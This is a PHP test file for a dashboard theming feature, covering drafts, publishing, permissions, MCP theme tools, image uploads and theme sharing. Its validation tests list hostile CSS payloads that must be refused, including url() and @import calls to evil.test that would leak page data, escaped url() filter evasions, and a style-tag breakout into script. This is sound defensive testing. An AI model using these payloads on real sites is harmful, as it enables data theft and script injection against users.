<?php

use App\Mcp\Tools\ThemeTools;
use App\Models\Activity;
use App\Models\ThemeShare;
use App\Models\User;
use App\Models\Workspace;
use App\Support\Theme\DashboardTheme;
use App\Support\Theme\ThemeCss;
use App\Support\Theme\ThemeSharing;
use App\Support\Theme\ThemeTemplates;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\Storage;
use Inertia\Testing\AssertableInertia as Assert;

function themeUrl(Workspace $workspace, string $path = ''): string
{
    return 'https://'.$workspace->host().'/settings/theme'.$path;
}

function themeMember(Workspace $workspace, string $role): User
{
    $user = User::factory()->create();
    $workspace->members()->attach($user, ['role' => $role]);

    return $user;
}

test('a draft shows only to the person editing it, and publishing shows it to everyone', function () {
    $workspace = Workspace::factory()->create();
    $owner = $workspace->owner;
    $member = themeMember($workspace, 'member');
    $css = "html:root { --ds-accent: #1621d1; }\n";

    $this->actingAs($owner)->put(themeUrl($workspace, '/draft'), ['css' => $css])->assertSessionHasNoErrors();

    $this->actingAs($owner)->get('https://'.$workspace->host().'/machines')
        ->assertSee('<style id="workspace-theme">', false)
        ->assertSee('--ds-accent: #1621d1', false)
        ->assertInertia(fn (Assert $page) => $page->where('workspaceTheme.draft', true)->where('workspaceTheme.published', false));
    $this->actingAs($member)->get('https://'.$workspace->host().'/machines')
        ->assertDontSee('workspace-theme', false)
        ->assertInertia(fn (Assert $page) => $page->where('workspaceTheme.css', null)->where('workspaceTheme.draft', false));

    $this->actingAs($owner)->post(themeUrl($workspace, '/publish'))->assertSessionHasNoErrors();
    expect($workspace->fresh()->theme_css)->toBe($css)
        ->and($workspace->fresh()->theme_draft_css)->toBeNull()
        ->and(Activity::query()->where('action', 'workspace.theme_publish')->exists())->toBeTrue();

    $this->actingAs($member)->get('https://'.$workspace->host().'/machines')
        ->assertSee('--ds-accent: #1621d1', false)
        ->assertInertia(fn (Assert $page) => $page->where('workspaceTheme.css', $css)->where('workspaceTheme.published', true));

    $this->actingAs($member)->get('https://'.$workspace->host().'/machines?theme=off')
        ->assertDontSee('workspace-theme', false)
        ->assertInertia(fn (Assert $page) => $page->where('workspaceTheme.off', true));
    $this->actingAs($member)->get('https://'.$workspace->host().'/machines')->assertDontSee('workspace-theme', false);
    $this->actingAs($member)->get('https://'.$workspace->host().'/machines?theme=on')->assertSee('workspace-theme', false);

    $this->actingAs($owner)->delete(themeUrl($workspace))->assertSessionHasNoErrors();
    expect($workspace->fresh()->theme_css)->toBeNull()
        ->and(Activity::query()->where('action', 'workspace.theme_off')->exists())->toBeTrue();
});

test('the theme page starts from the draft, lists the templates, and is only for people who manage settings', function () {
    $workspace = Workspace::factory()->create();
    $this->actingAs($workspace->owner)->put(themeUrl($workspace, '/draft'), ['css' => 'html:root { --ds-text: #000; }']);

    $this->actingAs($workspace->owner)->get(themeUrl($workspace))->assertOk()->assertInertia(fn (Assert $page) => $page
        ->component('workspace/settings/Theme')
        ->where('css', "html:root { --ds-text: #000; }\n")
        ->where('hasDraft', true)
        ->where('templates.0.key', 'starter')
        ->has('templates', count(app(ThemeTemplates::class)->all())));

    $member = themeMember($workspace, 'member');
    $this->actingAs($member)->get(themeUrl($workspace))->assertForbidden();
    $this->actingAs($member)->put(themeUrl($workspace, '/draft'), ['css' => 'a{}'])->assertForbidden();
    $this->actingAs($member)->post(themeUrl($workspace, '/publish'))->assertForbidden();
});

test('CSS that could leak the page or break out of its tag is refused', function (string $css) {
    $workspace = Workspace::factory()->create();

    $this->actingAs($workspace->owner)->put(themeUrl($workspace, '/draft'), ['css' => $css])->assertSessionHasErrors('css');
    expect($workspace->fresh()->theme_draft_css)->toBeNull();
})->with([
    'an import' => ['@import "https://evil.test/x.css";'],
    'an image from another site' => ['body { background: url(https://evil.test/leak?x=1); }'],
    'a protocol-relative address' => ["input[value^='a'] { background-image: url('//evil.test/a'); }"],
    'an escaped url()' => ['body { background: \75 rl(https://evil.test/a); }'],
    'an escaped host' => ['body { background: url(https:\2f\2f evil.test/a); }'],
    'image-set with a string' => ['body { background-image: image-set("https://evil.test/a.png" 1x); }'],
    'a closing style tag' => ['a { color: red; } </style><script>alert(1)</script>'],
    'javascript' => ['a { background: url(javascript:alert(1)); }'],
    'an import from another site, behind a comment' => ['@import/**/url("https://evil.test/y.css");'],
    'too big' => [str_repeat('a { color: red; }', 3000)],
    'a page on this panel, called as the viewer' => ["body { background: url('/settings/members?leak=1'); }"],
    'a panel page as a relative address' => ['body { background: url(logout); }'],
    'an uploaded image with a query string' => ['body { background: url(/storage/workspace-themes/1/a.png?x=1); }'],
    'a path that climbs out of the image folders' => ['body { background: url(/storage/workspace-themes/../../settings); }'],
    'an @import from this panel' => ['@import url(/storage/workspace-themes/1/a.png);'],
    'image-set with a panel page' => ['body { background-image: image-set("/workspaces" 1x); }'],
]);

test('templates, data URIs, panel images and font files from font hosts are allowed', function () {
    foreach (app(ThemeTemplates::class)->all() as $template) {
        expect(ThemeCss::problem($template['css']))->toBeNull();
    }

    expect(ThemeCss::problem(<<<'CSS'
        @import url('https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500&display=swap');
        @font-face { font-family: Brand; src: url(https://fonts.gstatic.com/s/brand/v1/a.woff2) format('woff2'); }
        [data-theme-part='sidebar'] { background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg'/%3E"), url(/images/logo.png); }
        .ds-pill::before { content: "\2192"; }
        .ds-tile { background: url(#grain), image-set(url(/storage/theme-shares/abc123def456/sky.webp) 1x); }
        CSS))->toBeNull();
});

test('Ask AI and MCP clients try a theme as a draft, start from a template, and publish it', function () {
    config()->set('mcp.groups', [ThemeTools::class]);
    $workspace = Workspace::factory()->create();
    $key = mcpKey($workspace);

    $read = mcpCall($workspace, $key, 'get_dashboard_theme');
    expect($read['error'])->toBeFalse()
        ->and($read['data']['editing'])->toBe('standard look')
        ->and($read['data']['guide'])->toContain('--ds-accent')
        ->and(array_column($read['data']['templates'], 'key'))->toContain('catppuccin', 'nord', 'gruvbox');

    $tried = mcpCall($workspace, $key, 'update_dashboard_theme', ['template' => 'catppuccin']);
    expect($tried['error'])->toBeFalse()
        ->and($workspace->fresh()->theme_draft_css)->toContain('#cba6f7')
        ->and($workspace->fresh()->theme_css)->toBeNull();

    $refused = mcpCall($workspace, $key, 'update_dashboard_theme', ['css' => 'body { background: url(https://evil.test/a); }']);
    expect($refused['error'])->toBeTrue()
        ->and($refused['text'])->toContain('evil.test')
        ->and($workspace->fresh()->theme_draft_css)->toContain('#cba6f7');

    $edited = mcpCall($workspace, $key, 'update_dashboard_theme', ['changes' => [['find' => '--ds-accent: #cba6f7;', 'replace' => '--ds-accent: #00cc88;']]]);
    expect($edited['error'])->toBeFalse()
        ->and($workspace->fresh()->theme_draft_css)->toContain('--ds-accent: #00cc88;')->toContain('#11111b');
    $missed = mcpCall($workspace, $key, 'update_dashboard_theme', ['changes' => [['find' => 'nothing like this', 'replace' => 'x']]]);
    expect($missed['error'])->toBeTrue()->and($missed['text'])->toContain('nowhere');

    mcpCall($workspace, $key, 'update_dashboard_theme', ['css' => 'html:root { --ds-accent: #ff0066; }']);
    $published = mcpCall($workspace, $key, 'publish_dashboard_theme');
    expect($published['error'])->toBeFalse()
        ->and($workspace->fresh()->theme_css)->toContain('#ff0066')
        ->and($workspace->fresh()->theme_draft_css)->toBeNull();

    expect(mcpCall($workspace, $key, 'publish_dashboard_theme')['error'])->toBeTrue();
});

test('people who can’t manage settings can’t change the theme over MCP', function () {
    config()->set('mcp.groups', [ThemeTools::class]);
    $workspace = Workspace::factory()->create();
    $member = themeMember($workspace, 'member');

    $result = mcpCall($workspace, mcpKey($workspace, $member), 'update_dashboard_theme', ['template' => 'paper']);
    expect($result['error'])->toBeTrue()
        ->and($workspace->fresh()->theme_draft_css)->toBeNull();
});

test('images uploaded for a theme can be used as backgrounds, and only by people who manage settings', function () {
    Storage::fake('public');
    $workspace = Workspace::factory()->create();

    $this->actingAs($workspace->owner)->post(themeUrl($workspace, '/images'), ['image' => UploadedFile::fake()->image('Sky Line.jpg', 1600, 900)])
        ->assertSessionHasNoErrors();
    $this->actingAs($workspace->owner)->post(themeUrl($workspace, '/images'), ['image' => UploadedFile::fake()->create('evil.svg', 2, 'image/svg+xml')])
        ->assertSessionHasErrors('image');

    $images = app(DashboardTheme::class)->images($workspace);
    expect($images)->toHaveCount(1)
        ->and($images[0]['name'])->toStartWith('sky-line-')->toEndWith('.jpg')
        ->and($images[0]['url'])->toStartWith('/storage/workspace-themes/'.$workspace->id.'/')
        ->and(Activity::query()->where('action', 'workspace.theme_image')->exists())->toBeTrue();

    $css = "[data-theme-part='content'] { background: url({$images[0]['url']}) center / cover; }";
    expect(ThemeCss::problem($css))->toBeNull()
        ->and(ThemeCss::problem('body { background: url('.rtrim((string) config('app.url'), '/').$images[0]['url'].'); }'))->toBeNull();

    $this->actingAs($workspace->owner)->get(themeUrl($workspace))->assertInertia(fn (Assert $page) => $page->where('images.0.name', $images[0]['name']));

    $member = themeMember($workspace, 'member');
    $this->actingAs($member)->post(themeUrl($workspace, '/images'), ['image' => UploadedFile::fake()->image('a.png')])->assertForbidden();
    $this->actingAs($member)->delete(themeUrl($workspace, '/images/'.$images[0]['name']))->assertForbidden();

    $this->actingAs($workspace->owner)->delete(themeUrl($workspace, '/images/'.$images[0]['name']))->assertSessionHasNoErrors();
    expect(app(DashboardTheme::class)->images($workspace))->toBe([]);
});

test('a palette of a few colours becomes a whole theme, and a dark-only palette keeps the dashboard dark', function () {
    config()->set('mcp.groups', [ThemeTools::class]);
    $workspace = Workspace::factory()->create();

    $result = mcpCall($workspace, mcpKey($workspace), 'update_dashboard_theme', [
        'palette' => ['dark' => ['background' => '#050805', 'text' => '#39d353', 'accent' => '#39d353'], 'font' => 'Geist Mono'],
        'extra_css' => "[data-theme-part='sidebar'] { border-right: 1px solid var(--ds-border); }",
    ]);
    expect($result['error'])->toBeFalse();

    $css = (string) $workspace->fresh()->theme_draft_css;
    expect($css)->toContain('--theme-appearance: dark;')
        ->toContain("--font-ui: 'Geist Mono'")
        ->toContain('--ds-primary-text: #0a0a0a;')
        ->toContain('--ds-chart: #39d353;')
        ->toContain("[data-theme-part='sidebar']")
        ->not->toContain('html:root {'."\n".'    --ds-panel')
        ->and(substr_count($css, '--ds-'))->toBeGreaterThan(70)
        ->and(ThemeCss::problem($css))->toBeNull();

    $this->actingAs($workspace->owner)->get('https://'.$workspace->host().'/machines')
        ->assertSee('data-theme-appearance="dark"', false);

    $bad = mcpCall($workspace, mcpKey($workspace), 'update_dashboard_theme', ['palette' => ['light' => ['background' => 'red', 'text' => '#000', 'accent' => '#00f']]]);
    expect($bad['error'])->toBeTrue()->and($bad['text'])->toContain('hex');
});

test('a theme shared as a link shows publicly and others add it, images and all, as their draft', function () {
    Storage::fake('public');
    $from = Workspace::factory()->create(['name' => 'Acme']);
    $this->actingAs($from->owner)->post(themeUrl($from, '/images'), ['image' => UploadedFile::fake()->image('sky.jpg', 600, 400)]);
    $image = app(DashboardTheme::class)->images($from)[0];
    $css = "html:root { --ds-accent: #cba6f7; }\n[data-theme-part='content'] { background: url({$image['url']}) center / cover; }\n";

    $this->actingAs($from->owner)->post(themeUrl($from, '/shares'), ['name' => 'Acme night', 'css' => $css])->assertSessionHasNoErrors();
    $share = ThemeShare::query()->sole();
    expect($share->css)->toContain("/storage/theme-shares/{$share->token}/")->not->toContain('workspace-themes')
        ->and(Activity::query()->where('action', 'workspace.theme_share')->exists())->toBeTrue();
    Storage::disk('public')->assertExists("theme-shares/{$share->token}/{$image['name']}");

    auth()->logout();
    $this->get('/themes/'.$share->token)->assertOk()->assertInertia(fn (Assert $page) => $page
        ->component('themes/Show')
        ->where('theme.name', 'Acme night')
        ->where('theme.preview.light.accent', '#cba6f7')
        ->where('signedIn', false));
    $this->get('https://serveros.test/themes/'.$share->token.'/add')->assertRedirectContains('/login');
    $this->get('/themes/nosuchtheme1')->assertNotFound();

    $to = Workspace::factory()->create(['name' => 'Other']);
    $this->actingAs($to->owner)->get('/themes/'.$share->token)->assertInertia(fn (Assert $page) => $page
        ->where('workspaces', [['slug' => $to->slug, 'name' => 'Other']]));
    $this->actingAs($to->owner)->post('/themes/'.$share->token.'/import', ['workspace' => $to->slug])
        ->assertRedirect($to->url().'/settings/theme');

    $draft = (string) $to->fresh()->theme_draft_css;
    expect($draft)->toContain('#cba6f7')->toContain("/storage/workspace-themes/{$to->id}/")
        ->and($to->fresh()->theme_css)->toBeNull()
        ->and($share->fresh()->imports)->toBe(1)
        ->and(app(DashboardTheme::class)->images($to))->toHaveCount(1);

    $outsider = User::factory()->create();
    $this->actingAs($outsider)->post('/themes/'.$share->token.'/import', ['workspace' => $to->slug])->assertForbidden();

    $this->actingAs($from->owner)->delete(themeUrl($from, '/shares/'.$share->id))->assertSessionHasNoErrors();
    expect(ThemeShare::query()->count())->toBe(0);
    Storage::disk('public')->assertMissing("theme-shares/{$share->token}/{$image['name']}");
    $this->get('/themes/'.$share->token)->assertNotFound();
});

test('a theme comes in from a pasted link or a .css file, and bad ones are refused', function () {
    $from = Workspace::factory()->create();
    $share = app(ThemeSharing::class)->share($from, $from->owner, 'Shared', 'html:root { --ds-accent: #00cc88; }');
    $to = Workspace::factory()->create();

    $this->actingAs($to->owner)->post(themeUrl($to, '/import'), ['link' => $share->url()])->assertSessionHasNoErrors();
    expect($to->fresh()->theme_draft_css)->toContain('#00cc88');

    $this->actingAs($to->owner)->post(themeUrl($to, '/import'), ['file' => UploadedFile::fake()->createWithContent('mine.css', 'html.dark { --ds-accent: #ff6600; }')])
        ->assertSessionHasNoErrors();
    expect($to->fresh()->theme_draft_css)->toContain('#ff6600');

    $this->actingAs($to->owner)->post(themeUrl($to, '/import'), ['link' => 'https://serveros.test/themes/doesnotexist'])->assertSessionHasErrors('link');
    $this->actingAs($to->owner)->post(themeUrl($to, '/import'), ['file' => UploadedFile::fake()->createWithContent('evil.css', '@import url(https://evil.test/x.css);')])
        ->assertSessionHasErrors('file');

    $member = themeMember($to, 'member');
    $this->actingAs($member)->post(themeUrl($to, '/import'), ['link' => $share->url()])->assertForbidden();
    $this->actingAs($member)->post(themeUrl($to, '/shares'), ['name' => 'x', 'css' => 'a{}'])->assertForbidden();
});
